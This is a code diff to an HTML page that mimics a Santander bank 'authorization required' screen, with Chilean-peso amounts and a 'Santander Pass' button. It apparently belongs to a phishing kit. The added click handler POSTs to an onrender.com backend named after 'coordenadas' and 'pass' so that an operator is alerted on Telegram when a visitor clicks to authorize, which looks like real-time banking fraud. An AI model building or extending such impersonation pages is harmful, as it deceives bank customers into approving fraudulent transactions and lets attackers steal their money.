@@ -7,8 +7,8 @@
   <link rel="stylesheet" href="style.css">
   <style>
     .monto-box {
-      background-color: #4CAF50; /* verde */
-      color: #fff;               /* letras blancas */
+      background-color: #4CAF50;
+      color: #fff;
       padding: 8px 12px;
       border-radius: 6px;
       font-size: 15px;
@@ -41,7 +41,6 @@
     <h1>Autorización requerida</h1>
     <div class="sub-text">Estás solicitando el siguiente producto:</div>
 
-    <!-- Texto normal + monto en cuadro verde -->
     <div class="seleccion-texto" id="seleccionProducto"></div>
 
     <button class="btn-santander btn-center" id="autorizarBtn">
@@ -52,7 +51,7 @@
   </div>
 
   <script>
-    // Función para formatear en pesos chilenos sin decimales
+    // Formato CLP
     function formatoCLP(valor){
       return new Intl.NumberFormat("es-CL", {
         style: "currency",
@@ -82,8 +81,25 @@
       document.getElementById("seleccionProducto").innerHTML = texto;
     });
 
-    document.getElementById("autorizarBtn").addEventListener("click", function(){
+    document.getElementById("autorizarBtn").addEventListener("click", async function(){
       document.getElementById("mensaje").innerText = "Enviando Autorización a tu Santander Pass...";
+
+      try {
+        // Llamada al backend en Render para enviar notificación a Telegram
+        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje: "Autorizar!!!" })
+        });
+
+        if(response.ok){
+          document.getElementById("mensaje").innerText = "✅ Autorización enviada a Telegram.";
+        } else {
+          document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
+        }
+      } catch (error) {
+        document.getElementById("mensaje").innerText = "⚠️ No se pudo conectar con el servidor.";
+      }
     });
   </script>
 </body>
